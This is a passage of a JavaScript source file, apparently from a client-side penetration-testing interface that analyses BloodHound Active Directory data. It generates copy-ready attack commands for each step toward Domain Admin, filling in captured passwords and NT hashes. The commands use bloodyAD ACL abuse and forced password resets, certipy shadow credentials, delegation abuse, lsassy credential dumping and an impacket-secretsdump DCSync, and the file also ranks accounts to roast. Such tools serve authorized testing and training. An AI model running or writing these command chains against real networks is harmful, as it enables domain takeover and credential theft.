/*!
 * obol ui - routes/domain.js - BloodHound domain analysis, 100% client-side.
 * Upload a SharpHound zip (or BloodHound-CE JSONs) -> OBOL.bloodhound parses + derives the
 * high-value census + owned->DA attack paths + a self-contained printable report.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL || (root.OBOL = {});
  var U = OBOL.util;
  function esc(s) { return U.esc(s); }

  var _inspecting = null;
  var _lastEngId = null;

  // What-If sandbox: hypothetical-owned set layered on top of the real owned set, EPHEMERAL
  var _whatIf = {};
  function whatIfList() { return Object.keys(_whatIf).map(function (k) { return _whatIf[k]; }); }
  function isWhatIf(principal) {
    var rawUp = String(principal == null ? '' : principal).toUpperCase();
    var shUp = shortName(principal).toUpperCase();
    return !!(_whatIf[rawUp] || _whatIf[shUp]);
  }
  function effectiveOwned() {
    var all = ownedFromEngagement().concat(whatIfList());
    var seen = {}, out = [];
    all.forEach(function (o) {
      var k = String(o == null ? '' : o).toUpperCase();
      if (k && !seen[k]) { seen[k] = 1; out.push(o); }
    });
    return out;
  }

  function ownedFromEngagement() {
    var eng = OBOL.store.active() || {};
    var owned = [];
    (eng.credentials || []).forEach(function (c) { if (c.user) owned.push(String(c.user).toUpperCase()); });
    if (eng.params && eng.params.username) owned.push(String(eng.params.username).toUpperCase());
    var gathered = (OBOL.creds && OBOL.creds.gather) ? OBOL.creds.gather(eng) : [];
    gathered.forEach(function (c) {
      var u = c.user || c.username;
      if (u) owned.push(String(u).toUpperCase());
    });
    var extra = (eng.bloodhound && eng.bloodhound.ownedExtra) || [];
    extra.forEach(function (x) {
      if (!x) return;
      var s = String(x).trim();
      owned.push(s.indexOf('@') >= 0 ? s.toUpperCase() : s.split('@')[0].toUpperCase());
    });
    return owned.filter(function (v, i, a) { return v && a.indexOf(v) === i; });
  }

  function isOwnedPrincipal(principal, owned) {
    var rawUp = String(principal == null ? '' : principal).toUpperCase();
    var short = shortName(principal).toUpperCase();
    return (owned || []).some(function (o) {
      var oUp = String(o == null ? '' : o).toUpperCase();
      if (oUp.indexOf('@') >= 0 && rawUp.indexOf('@') >= 0) return oUp === rawUp;
      return shortName(o).toUpperCase() === short;
    });
  }

  function cmdCtxFor(principal) { return cmdCtx([principal], true); }

  function cmdCtx(owned, includeSecret) {
    var eng = OBOL.store.active() || {}, params = eng.params || {};
    var dc = null;
    try {
      var facts = OBOL.store.factSet();
      var dcf = (facts.values && facts.values('ad.dc_candidate')) || [];
      if (dcf[0] && dcf[0].host) dc = dcf[0].host;
      var ctxOut = { dc: dc || params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null, pw: null, nt: null };
      if (includeSecret && owned && owned.length) {
        var firstUser = String(owned[0]).split('@')[0].toLowerCase();
        var creds = [];
        try { creds = (OBOL.creds && OBOL.creds.gather) ? OBOL.creds.gather(eng, facts) : (eng.credentials || []); }
        catch (e) { creds = eng.credentials || []; }
        var c = creds.filter(function (x) { return x && x.user && String(x.user).split('@')[0].toLowerCase() === firstUser; })[0];
        if (!c && params.username && String(params.username).split('@')[0].toLowerCase() === firstUser) {
          c = { user: params.username, password: params.password, nthash: params.nthash };
        }
        if (c) {
          var h = c.nthash || c.hash, pw = c.password || c.plaintext || c.secret;
          if (h && /^[a-fA-F0-9]{32}$/.test(String(h))) { ctxOut.secret = '-H ' + h; ctxOut.nt = h; }
          else if (pw) { ctxOut.secret = "-p '" + String(pw).replace(/'/g, "'\\''") + "'"; ctxOut.pw = pw; }
        }
      }
      return ctxOut;
    } catch (e) { return { dc: params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null }; }
  }

  function shortName(s) { return String(s == null ? '' : s).split('@')[0]; }

  function coachQueued() {
    try {
      var ranked = OBOL.pack.rankActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
      return { top: ranked[0] || null, count: ranked.length };
    } catch (e) { return { top: null, count: 0 }; }
  }

  function bdPrefix(ctx, domain, you) {
    var auth = ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ("-p ':" + ctx.nt + "'") : "-p '<password>'");
    return "bloodyAD -u '" + (you || '<you>') + "' " + auth + " -d " + (domain || '<domain>') + " --host " + (ctx.dc || '<dc-ip>');
  }

  function hopCommand(hop, ctx, domain, you) {
    ctx = ctx || {};
    var pre = bdPrefix(ctx, domain, you);
    var tgt = shortName(hop.to);
    var fullTo = String(hop.to || tgt);
    var edge = String(hop.edge || '');
    var kind = String(hop.to_kind || '').toLowerCase();
    var cAuth = ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ('-hashes :' + ctx.nt) : "-p '<password>'");
    var nxcAuth = ctx.secret || (ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ('-H ' + ctx.nt) : "-p '<password>'"));
    var impAuth = ctx.pw
      ? ("'" + (domain || '<domain>') + '/' + (you || '<you>') + ':' + String(ctx.pw).replace(/'/g, "'\\''") + "'")
      : (ctx.nt ? ("-hashes :" + ctx.nt + " '" + (domain || '<domain>') + '/' + (you || '<you>') + "'") : ("'" + (domain || '<domain>') + '/' + (you || '<you>') + ":<password>'"));

    if (/^(memberof|getchanges|getchangesall|dcsync)$/i.test(edge)) return '';
    if (/domain/.test(kind) && /genericall|writedacl|owns|writeowner|allextendedrights/i.test(edge)) {
      return pre + " add dcsync '" + (you || '<you>') + "'";
    }
    if (/group/.test(kind) || /addmember|addself/i.test(edge)) {
      if (/writeowner/i.test(edge)) {
        return pre + " set owner '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
      }
      if (/writedacl|owns/i.test(edge)) {
        return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
      }
      return pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
    }
    if (/forcechangepassword/i.test(edge)) {
      return pre + " set password '" + tgt + "' 'Newp@ss123!'";
    }
    if (/addkeycredentiallink/i.test(edge)) {
      return "certipy shadow auto -u '" + (you || '<you>') + '@' + (domain || '<domain>') + "' " + cAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -account '" + tgt + "'";
    }
    if (/writespn/i.test(edge)) {
      return pre + " set object '" + tgt + "' servicePrincipalName -v 'http/anything' && impacket-GetUserSPNs " + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -request-user '" + tgt + "'";
    }
    if (/readgmsapassword/i.test(edge)) {
      return 'nxc ldap ' + (ctx.dc || '<dc-ip>') + " -u '" + (you || '<you>') + "' " + nxcAuth + ' --gmsa';
    }
    if (/readlapspassword|synclapspassword/i.test(edge)) {
      return 'nxc ldap ' + (ctx.dc || '<dc-ip>') + " -u '" + (you || '<you>') + "' " + nxcAuth + ' -M laps';
    }
    if (/addallowedtoact/i.test(edge)) {
      return 'impacket-rbcd -delegate-from \'<CONTROLLED_COMP>$\' -delegate-to \'' + tgt.replace(/\$$/, '') + '$\' -action write ' + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>')
        + " && impacket-getST -spn 'cifs/" + fullTo + "' -impersonate Administrator '" + (domain || '<domain>') + "/<CONTROLLED_COMP>$:<COMP_PASS>' -dc-ip " + (ctx.dc || '<dc-ip>');
    }
    if (/allowedtoact|allowedtodelegate/i.test(edge)) {
      return "impacket-getST -spn 'cifs/" + fullTo + "' -impersonate Administrator " + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>');
    }
    if (/gpoabuse|gplink/i.test(edge) || /gpo/.test(kind)) {
      return 'python3 pygpoabuse.py ' + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -gpo-id '<GPO_GUID>' -f";
    }
    if (/hassidhistory/i.test(edge)) {
      return 'impacket-secretsdump ' + impAuth + '@' + (ctx.dc || '<dc-ip>') + '   # authenticate carrying sidHistory privilege of ' + tgt;
    }
    if (/adminto/i.test(edge)) {
      return 'nxc smb ' + fullTo + " -u '" + (you || '<you>') + "' " + nxcAuth + ' -M lsassy';
    }
    if (/canpsremote/i.test(edge)) {
      return 'evil-winrm -i ' + fullTo + " -u '" + (you || '<you>') + "' " + nxcAuth;
    }
    if (/canrdp/i.test(edge)) {
      return "xfreerdp /u:'" + (you || '<you>') + "' /v:" + fullTo + ' /cert:ignore';
    }
    if (/executedcom/i.test(edge)) {
      return 'impacket-dcomexec -object MMC20 ' + impAuth + '@' + fullTo;
    }
    if (/sqladmin/i.test(edge)) {
      return 'impacket-mssqlclient ' + impAuth + '@' + fullTo + ' -windows-auth';
    }
    if (/hassession/i.test(edge)) {
      return 'nxc smb ' + shortName(hop.from) + " -u '" + (you || '<you>') + "' " + nxcAuth + ' -M lsassy   # harvest active session of ' + tgt;
    }
    if (/writeowner/i.test(edge)) {
      return pre + " set owner '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
    }
    if (/writedacl|owns/i.test(edge)) {
      return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
    }
    if (/genericwrite/i.test(edge) && /user|computer/.test(kind)) {
      return "certipy shadow auto -u '" + (you || '<you>') + '@' + (domain || '<domain>') + "' " + cAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -account '" + tgt + "'";
    }
    if (/genericall|genericwrite|allextendedrights/i.test(edge)) {
      return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
    }
    return pre + '  # abuse ' + edge + ' on ' + tgt;
  }

  // Walk a multi-hop chain and update the active identity/credential context when a hop compromises
  // a new principal (e.g. ForceChangePassword, AddKeyCredentialLink, ReadGMSAPassword, HasSession).
  function pathCommandChain(hops, baseCtx, domain, startYou) {
    var curYou = startYou || '<you>';
    var curCtx = Object.assign({}, baseCtx || {});
    var steps = [];
    (hops || []).forEach(function (h) {
      var cmd = hopCommand(h, curCtx, domain, curYou);
      var edge = String(h.edge || '');
      var kind = String(h.to_kind || '').toLowerCase();
      var nextTarget = shortName(h.to);
      if (cmd) {
        steps.push({ hop: h, cmd: cmd, actor: curYou, target: nextTarget, edge: edge });
      }
      // Identity handoff for subsequent hops when this hop takes over a user/service account
      if (/forcechangepassword/i.test(edge)) {
        curYou = nextTarget;
        curCtx = Object.assign({}, curCtx, { pw: 'Newp@ss123!', nt: null, secret: "-p 'Newp@ss123!'" });
      } else if (/addkeycredentiallink/i.test(edge) || (/genericwrite/i.test(edge) && /user/.test(kind))) {
        curYou = nextTarget;
        curCtx = Object.assign({}, curCtx, { pw: null, nt: '<SHADOW_NTHASH>', secret: '-H <SHADOW_NTHASH>' });
      } else if (/readgmsapassword/i.test(edge)) {
        curYou = nextTarget;
        curCtx = Object.assign({}, curCtx, { pw: null, nt: '<GMSA_NTHASH>', secret: '-H <GMSA_NTHASH>' });
      } else if (/hassession/i.test(edge)) {
        curYou = nextTarget;
        curCtx = Object.assign({}, curCtx, { pw: null, nt: '<SESSION_NTHASH>', secret: '-H <SESSION_NTHASH>' });
      } else if (/genericall|writedacl|writeowner|owns|allextendedrights/i.test(edge) && /user/.test(kind)) {
        curYou = nextTarget;
        curCtx = Object.assign({}, curCtx, { pw: 'Newp@ss123!', nt: null, secret: "-p 'Newp@ss123!'" });
      }
    });
    return { steps: steps, finalYou: curYou, finalCtx: curCtx };
  }

  function routeStepsHtml(view, owned, summary, ctx, pathIdx) {
    var an = (view && view.analysis) || {};
    if (!an.headline) return '';
    var domain = (summary && summary.domain) || '';
    var out = '<h2 class="coach-sec-h">Route To Domain Admin</h2><div class="bh-route"><p class="bh-route-head">' + esc(an.headline) + '</p>';
    if (an.paths && an.paths.length) {
      var daSet = {};
      ((summary && summary.domain_admins) || []).forEach(function (d) { daSet[shortName(d).toUpperCase()] = 1; });
      var selPath = null;
      if (typeof pathIdx === 'number' && an.paths[pathIdx]) {
        selPath = an.paths[pathIdx];
      } else {
        selPath = an.paths.filter(function (p) {
          var s = (p.hops && p.hops[0] && p.hops[0].from) ? shortName(p.hops[0].from).toUpperCase() : '';
          return !daSet[s] && (p.hops || []).some(function (h) { return !/memberof/i.test(h.edge); });
        })[0] || an.paths.filter(function (p) {
          return (p.hops || []).some(function (h) { return !/memberof/i.test(h.edge); });
        })[0] || an.paths[0];
      }
      var hops = (selPath && selPath.hops) || [];
      var you = (hops[0] && hops[0].from) ? shortName(hops[0].from) : (shortName((owned && owned[0]) || '') || '<you>');
      var pCtx = (hops[0] && hops[0].from) ? cmdCtxFor(you) : (ctx || cmdCtx(owned, true));
      var chain = '<div class="bh-route-chain"><span class="bh-rn owned">' + esc(you) + '</span>';
      hops.forEach(function (h, hi) {
        var isGoal = hi === hops.length - 1 || /domain/.test(String(h.to_kind || '').toLowerCase());
        chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (isGoal ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>';
      });
      out += chain + '</div><ol class="bh-steps">';
      var walked = pathCommandChain(hops, pCtx, domain, you);
      walked.steps.forEach(function (st) {
        var actorNote = st.actor !== you ? (' <span class="bh-x-kind">(as ' + esc(st.actor) + ')</span>') : '';
        out += '<li><div class="bh-step-what">' + esc(st.edge) + ' on <b>' + esc(st.target) + '</b>' + actorNote + '</div>'
          + '<div class="bh-cmd"><code>' + esc(st.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(st.cmd) + '">Copy</button></div></li>';
      });
      var dumpDom = domain || '<domain>';
      var fCtx = walked.finalCtx, fYou = walked.finalYou;
      var dump = fCtx.nt
        ? 'impacket-secretsdump -hashes :' + fCtx.nt + " '" + dumpDom + '/' + fYou + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc'
        : "impacket-secretsdump '" + dumpDom + '/' + fYou + ':' + (fCtx.pw ? String(fCtx.pw).replace(/'/g, "'\\''") : '<password>') + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc';
      out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
        + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol>';
    }
    out += '</div>';
    return out;
  }

  function expandableList(itemsHtml, limit, noun) {
    limit = limit || 8;
    var n = itemsHtml.length;
    if (n <= limit) return '<ul class="bh-princ">' + itemsHtml.join('') + '</ul>';
    var head = itemsHtml.slice(0, limit).join(''), rest = itemsHtml.slice(limit).join('');
    var extra = n - limit;
    return '<ul class="bh-princ">' + head + '</ul>'
      + '<ul class="bh-princ bh-more" hidden>' + rest + '</ul>'
      + '<button class="bh-more-btn" type="button">+ ' + extra + ' more ' + esc(noun || 'item') + (extra === 1 ? '' : 's') + '</button>';
  }

  function ownedRouteCommands(principal, paths, summary, ctx) {
    if (!paths || !paths.paths || !paths.paths.length) {
      return '<div class="bh-acq"><div class="bh-acq-h">You Own ' + esc(shortName(principal)) + '</div>'
        + '<p class="bh-x-line bh-x-none">No path to Domain Admin from this account, use what it controls above, or pivot.</p></div>';
    }
    var you = shortName(principal), domain = (summary && summary.domain) || '';
    var hops = paths.paths[0];
    var out = '<div class="bh-acq"><div class="bh-acq-h">Walk This Path (you own ' + esc(you) + ')</div><ol class="bh-steps">';
    var walked = pathCommandChain(hops, ctx, domain, you);
    walked.steps.forEach(function (st) {
      var actorNote = st.actor !== you ? (' <span class="bh-x-kind">(as ' + esc(st.actor) + ')</span>') : '';
      out += '<li><div class="bh-step-what">' + esc(st.edge) + ' on <b>' + esc(st.target) + '</b>' + actorNote + '</div>'
        + '<div class="bh-cmd"><code>' + esc(st.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(st.cmd) + '">Copy</button></div></li>';
    });
    var dumpDom = domain || '<domain>';
    var fCtx = walked.finalCtx, fYou = walked.finalYou;
    var dump = fCtx.nt
      ? 'impacket-secretsdump -hashes :' + fCtx.nt + " '" + dumpDom + '/' + fYou + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc'
      : "impacket-secretsdump '" + dumpDom + '/' + fYou + ':' + (fCtx.pw ? String(fCtx.pw).replace(/'/g, "'\\''") : '<password>') + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc';
    out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
      + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol></div>';
    return out;
  }

  function inspectHtml(principal, summary, owned, ctx) {
    if (!principal || !summary) return '';
    var isReal = isOwnedPrincipal(principal, ownedFromEngagement());
    var isWI = !isReal && isWhatIf(principal);
    var isOwned = isReal || isWI;
    var prof = OBOL.bloodhound.principalProfile(summary, principal);
    var paths = OBOL.bloodhound.ownedPaths(summary, [principal]) || { paths: [] };
    var ctl = OBOL.bloodhound.controls(summary, principal) || { controls: [], groups: [], count: 0 };

    var tags = [];
    if (isReal) tags.push('<span class="bh-tag own">Owned</span>');
    else if (isWI) tags.push('<span class="bh-tag crit">What-If</span>');
    if (prof.dcsync) tags.push('<span class="bh-tag crit">Can DCSync</span>');
    if (prof.unconstrained) tags.push('<span class="bh-tag crit">Unconstrained Delegation</span>');
    if (prof.high_value) tags.push('<span class="bh-tag crit">High Value</span>');
    if (prof.kerberoastable) tags.push('<span class="bh-tag warn">Kerberoastable</span>');
    if (prof.asrep_roastable) tags.push('<span class="bh-tag warn">AS-REP</span>');
    if (prof.password_not_required) tags.push('<span class="bh-tag free">Blank Password</span>');

    var displayTitle = (summary.domains && summary.domains.length > 1 && prof.name && prof.name.indexOf('@') >= 0) ? prof.name : shortName(principal);
    var out = '<div class="bh-explore-card"><h3>' + esc(displayTitle)
      + ' <span class="bh-x-kind">' + esc(prof.type || 'principal') + '</span></h3>'
      + (tags.length ? '<div class="bh-x-tags">' + tags.join('') + '</div>' : '');

    if (paths.paths && paths.paths.length) {
      var hops = paths.paths[0];
      var chain = '<span class="bh-rn' + (isOwned ? ' owned' : '') + '">' + esc(shortName(principal)) + '</span>';
      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
      out += '<p class="bh-x-line"><b>' + paths.paths.length + '</b> path(s) to Domain Admin, shortest ' + hops.length + ' hop(s):</p><div class="bh-route-chain">' + chain + '</div>';
    } else {
      out += '<p class="bh-x-line bh-x-none">No outbound path to Domain Admin derived from this account (dead-end in this collection).</p>';
    }

    if (ctl.count) {
      out += '<p class="bh-x-line">Controls <b>' + ctl.count + '</b> object(s)' + (ctl.groups.length ? ', member of ' + ctl.groups.length + ' group(s)' : '') + ':</p>'
        + expandableList(ctl.controls.map(function (x) {
            return '<li><span class="bh-re">' + esc(x.edge) + '</span> <button class="bh-princ-x" data-explore="' + U.attr(x.name) + '">' + esc(shortName(x.name)) + '</button> <span class="bh-x-kind">' + esc(x.type) + '</span></li>';
          }), 8, 'controlled object');
    } else {
      out += '<p class="bh-x-line bh-x-none">Controls 0 objects (standard group membership only - no outbound ACL rights).</p>';
    }

    if (ctl.inbound && ctl.inbound.length) {
      out += '<p class="bh-x-line">Controlled by <b>' + ctl.inbound.length + '</b> principal(s) (inbound ACLs onto ' + esc(shortName(principal)) + '):</p>'
        + expandableList(ctl.inbound.map(function (x) {
            return '<li><button class="bh-princ-x" data-explore="' + U.attr(x.name) + '">' + esc(shortName(x.name)) + '</button> <span class="bh-x-kind">' + esc(x.type) + '</span> <span class="bh-re">' + esc(x.edge) + '</span></li>';
          }), 6, 'inbound controller');
    }

    var hasPaths = !!(paths.paths && paths.paths.length);
    if (isWI) {
      out += '<p class="bh-x-line bh-whatif-note">What-If: ' + (hasPaths ? 'the commands below assume you own this account. ' : 'this account has 0 outbound paths to Domain Admin (shown on the graph as a dead-end node). ')
        + '<button class="bh-whatif-x" data-whatif-remove="' + U.attr(principal) + '">Remove From What-If</button></p>';
      out += ownedRouteCommands(principal, paths, summary, ctx);
    } else if (isReal) {
      out += ownedRouteCommands(principal, paths, summary, ctx);
    } else {
      var ownedCtx = (ctx && (ctx.pw || ctx.nt)) ? ctx : cmdCtx(owned, true);
      var acqCtx = Object.assign({}, ownedCtx, { you: (owned && owned[0]) ? shortName(owned[0]) : null });
      var acq = OBOL.bloodhound.acquisitionLines(summary, principal, acqCtx);
      if (acq.length) {
        out += '<div class="bh-acq"><div class="bh-acq-h">How To Get This Account</div>'
          + acq.map(function (a) {
              return '<div class="bh-acq-why">' + esc(a.why) + '</div>'
                + '<div class="bh-cmd"><code>' + esc(a.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(a.cmd) + '">Copy</button></div>';
            }).join('') + '</div>';
      }
      var gateNote = hasPaths
        ? 'The commands for walking this account\'s path stay hidden until you own it. Tick the box when you really do (or paste proof in Cockpit, or re-upload BloodHound). "Try As What-If" layers it on hypothetically, without touching the engagement, so you can see how the picture would change.'
        : 'This account has 0 outbound paths to Domain Admin in this collection, so owning it adds no new privilege escalation routes (it is shown on the left of the graph as a dead-end node).';
      out += '<div class="bh-gate"><label class="bh-gate-own"><input type="checkbox" class="bh-own-check" data-own="' + U.attr(principal) + '"> I Own This Account Now</label>'
        + ' <button class="bh-whatif-x" data-whatif-add="' + U.attr(principal) + '">Try As What-If</button>'
        + '<p class="bh-gate-note">' + gateNote + '</p></div>';
    }
    return out + '</div>';
  }

  function labelFlag(key) {
    return ({
      dcsync_principals: 'Able To DCSync',
      kerberoastable: 'Kerberoastable',
      asrep_roastable: 'AS-REP Roastable',
      password_not_required: 'Blank-Password (PASSWD_NOTREQD)',
      unconstrained_delegation: 'Unconstrained Delegation'
    })[key] || key;
  }

  function diffHtml(diff) {
    if (!diff || (!diff.changed && !diff.route)) return '';
    function edgeLi(e) {
      return '<li><button class="bh-princ-x" data-explore="' + U.attr(e.from) + '">' + esc(shortName(e.from)) + '</button>'
        + ' <span class="bh-re">' + esc(e.edge) + '</span> '
        + '<button class="bh-princ-x" data-explore="' + U.attr(e.to) + '">' + esc(shortName(e.to)) + '</button></li>';
    }
    var out = '<h2 class="coach-sec-h">What Changed Since Last Collection</h2><div class="bh-diff">';
    if (diff.route) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h fast">A faster route to Domain Admin opened: '
        + diff.route.now + ' hop' + (diff.route.now === 1 ? '' : 's')
        + (diff.route.prev ? (' (was ' + diff.route.prev + ')') : ', where there was none before')
        + '. OBOL re-ranked your next moves.</div></div>';
    }
    if (diff.edges.added.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h add">New leverage: ' + diff.edges.added.length + ' edge' + (diff.edges.added.length === 1 ? '' : 's') + '</div>'
        + expandableList(diff.edges.added.map(edgeLi), 8, 'edge') + '</div>';
    }
    if (diff.edges.removed.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h rem">Gone: ' + diff.edges.removed.length + ' edge' + (diff.edges.removed.length === 1 ? '' : 's') + '</div>'
        + expandableList(diff.edges.removed.map(edgeLi), 8, 'edge') + '</div>';
    }
    Object.keys(diff.flags).forEach(function (k) {
      var f = diff.flags[k];
      if (f.added.length) {
        out += '<div class="bh-diff-sec"><div class="bh-diff-h add">Now ' + esc(labelFlag(k)) + ' (' + f.added.length + ')</div>'
          + '<div class="bh-diff-names">' + f.added.map(function (x) { return '<button class="bh-princ-x" data-explore="' + U.attr(x) + '">' + esc(shortName(x)) + '</button>'; }).join(' ') + '</div></div>';
      }
      if (f.removed.length) {
        out += '<div class="bh-diff-sec"><div class="bh-diff-h rem">No Longer ' + esc(labelFlag(k)) + ' (' + f.removed.length + ')</div>'
          + '<div class="bh-diff-names">' + f.removed.map(function (x) { return esc(shortName(x)); }).join(', ') + '</div></div>';
      }
    });
    if (diff.principals.added.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h add">New principals (' + diff.principals.added.length + ')</div>'
        + '<div class="bh-diff-names">' + diff.principals.added.slice(0, 40).map(function (p) { return esc(shortName(p.name)); }).join(', ')
        + (diff.principals.added.length > 40 ? ', and ' + (diff.principals.added.length - 40) + ' more' : '') + '</div></div>';
    }
    if (diff.principals.removed.length) {
      out += '<div class="bh-diff-sec"><div class="bh-diff-h rem">Removed principals (' + diff.principals.removed.length + ')</div>'
        + '<div class="bh-diff-names">' + diff.principals.removed.slice(0, 40).map(function (p) { return esc(shortName(p.name)); }).join(', ')
        + (diff.principals.removed.length > 40 ? ', and ' + (diff.principals.removed.length - 40) + ' more' : '') + '</div></div>';
    }
    return out + '</div>';
  }

  function huntHtml(summary, owned, ctx) {
    var hunt = OBOL.bloodhound.bestNextTargets(summary, owned, { limit: 50 });
    if (!hunt.targets.length) return '';
    var acqCtx = Object.assign({}, ctx, { you: (owned && owned[0]) ? shortName(owned[0]) : null });
    var chipName = { asrep: 'AS-REP', kerberoast: 'Kerberoast', blankpw: 'Blank Password' };
    function valueLine(t) {
      if (t.hops == null) return 'A free credential, no direct path to Domain Admin from it.';
      if (hunt.currentBest == null) return 'Opens a route to Domain Admin: ' + t.hops + ' hop' + (t.hops === 1 ? '' : 's') + '.';
      if (t.saves > 0) return t.hops + ' hop' + (t.hops === 1 ? '' : 's') + ' to Domain Admin, a shortcut that saves ' + t.saves + ' hop' + (t.saves === 1 ? '' : 's') + '.';
      return t.hops + ' hop' + (t.hops === 1 ? '' : 's') + ' to Domain Admin.';
    }
    function rowHtml(t) {
      var acq = OBOL.bloodhound.acquisitionLines(summary, t.name, acqCtx)[0];
      var cmd = acq ? ('<div class="bh-cmd"><code>' + esc(acq.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(acq.cmd) + '">Copy</button></div>') : '';
      return '<div class="bh-hunt-row"><div class="bh-hunt-top">'
        + '<button class="bh-princ-x" data-explore="' + U.attr(t.name) + '">' + esc(t.short) + '</button> <span class="bh-x-kind">' + esc(t.type) + '</span>'
        + t.weaknesses.map(function (w) { return '<span class="bh-tag warn">' + esc(chipName[w] || w) + '</span>'; }).join('')
        + (t.saves > 0 ? '<span class="bh-tag crit">Shortcut</span>' : '') + '</div>'
        + '<div class="bh-hunt-val">' + esc(valueLine(t)) + '</div>' + cmd + '</div>';
    }
    var rows = hunt.targets.map(rowHtml);
    var out = '<h2 class="coach-sec-h">Best Accounts To Hunt Next</h2>'
      + '<p class="route-sub">Accounts you can go get right now (their own BloodHound flags say how), ranked by how close owning them puts you to Domain Admin. On an exam, go hunt these.</p>';
    if (rows.length <= 6) {
      out += '<div class="bh-hunt">' + rows.join('') + '</div>';
    } else {
      out += '<div class="bh-hunt">' + rows.slice(0, 6).join('') + '</div>'
        + '<div class="bh-hunt bh-more" hidden>' + rows.slice(6).join('') + '</div>'
        + '<button class="bh-more-btn" type="button">+ ' + (rows.length - 6) + ' more target' + (rows.length - 6 === 1 ? '' : 's') + '</button>';
    }
    return out;
  }

  // Live AD Reconnaissance summary from facts already proven in the engagement (useful even before BloodHound upload)
  function liveAdFactsHtml() {
    try {
      var eng = OBOL.store.active() || {};
      var params = eng.params || {};
      var facts = OBOL.store.factSet();
      if (!facts || !facts.values) return '';
      function dedupCI(list) {
        var seen = {}, out = [];
        (list || []).forEach(function (item) {
          var s = String(item || '').trim();
          if (!s) return;
          var k = s.toUpperCase();
          if (!seen[k]) { seen[k] = 1; out.push(s); }
        });
        return out;
      }
      var rawDoms = (facts.values('ad.domain_known') || []).map(function (v) { return v && v.name; }).filter(Boolean);
      if (!rawDoms.length && params.domain) rawDoms.push(params.domain);
      var doms = dedupCI(rawDoms);
      var dcs = dedupCI((facts.values('ad.dc_candidate') || []).map(function (v) { return v && v.host; }).filter(Boolean));
      var uLists = facts.values('ad.user_list') || [];
      var uCount = uLists.reduce(function (acc, v) { return acc + ((v && v.users && v.users.length) || (v && v.count) || 0); }, 0);
      var aclLeads = facts.values('ad.acl_lead') || [];
      var rawAcl = [];
      aclLeads.forEach(function (v) { ((v && v.targets) || []).forEach(function (t) { if (t) rawAcl.push(t); }); });
      var aclTargets = dedupCI(rawAcl);
      var owned = dedupCI(ownedFromEngagement());
      if (!doms.length && !dcs.length && !uCount && !aclTargets.length && !owned.length) return '';

      var chips = [];
      if (doms.length) chips.push('<span class="bh-tag own">Domain: ' + esc(doms.join(', ')) + '</span>');
      if (dcs.length) chips.push('<span class="bh-tag">DC: ' + esc(dcs[0]) + '</span>');
      if (owned.length) chips.push('<span class="bh-tag own">Owned creds: ' + esc(owned.join(', ')) + '</span>');
      if (uCount) chips.push('<span class="bh-tag">' + uCount + ' LDAP users enumerated</span>');
      if (aclTargets.length) chips.push('<span class="bh-tag crit">Writable ACL leads: ' + esc(aclTargets.slice(0, 4).join(', ')) + '</span>');
      return '<div class="bh-route" id="bh-live-ad"><div class="bh-acq-h">Live AD Reconnaissance (from Cockpit)</div>'
        + '<div class="bh-x-tags">' + chips.join(' ') + '</div></div>';
    } catch (e) {
      return '';
    }
  }

  // Beginner-friendly BloodHound collection commands pre-filled from engagement parameters
  function collectionGuideHtml(hasSummary) {
    var eng = OBOL.store.active() || {};
    var params = eng.params || {};
    var owned = ownedFromEngagement();
    var ctx = cmdCtx(owned, true);
    var dom = (eng.bloodhound && eng.bloodhound.domain) || params.domain || '<domain.local>';
    var dc = ctx.dc || params.target || '<dc-ip>';
    var user = (owned && owned[0]) ? shortName(owned[0]) : (params.username || '<user>');
    var pw = ctx.pw || params.password || '<password>';
    var authFlag = ctx.nt ? ('--hashes :' + ctx.nt) : ("-p '" + String(pw).replace(/'/g, "'\\''") + "'");
